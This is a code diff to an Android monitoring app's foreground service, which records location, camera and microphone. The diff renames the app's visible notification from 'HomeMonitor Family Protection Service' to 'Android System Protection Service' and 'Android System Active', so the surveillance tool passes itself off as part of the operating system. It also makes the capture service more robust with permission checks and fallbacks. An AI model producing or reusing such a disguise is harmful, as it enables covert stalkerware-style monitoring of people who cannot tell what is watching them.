@@ -310,10 +310,10 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "HomeMonitor Family Protection Service",
+                "Android System Protection Service",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Monitors family safety, device health, and location."
+                description = "Monitors system health, location, and family safety."
             }
             notificationManager.createNotificationChannel(channel)
         }
@@ -326,18 +326,45 @@ class MonitorService : LifecycleService() {
         )
 
         val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("HomeMonitor Protection Active")
-            .setContentText("Family safety and device health monitoring is active.")
+            .setContentTitle("Android System Active")
+            .setContentText("System health and location protection is active.")
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                var fgsType = 0
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                    }
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
+                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    }
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                    }
+                }
+                if (fgsType != 0) {
+                    startForeground(NOTIFICATION_ID, notification, fgsType)
+                } else {
+                    startForeground(NOTIFICATION_ID, notification)
+                }
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "startForeground exception fallback: ${e.message}")
+            try {
+                startForeground(NOTIFICATION_ID, notification)
+            } catch (e2: Exception) {
+                Log.e(TAG, "Fallback startForeground failed: ${e2.message}")
+            }
         }
     }
 
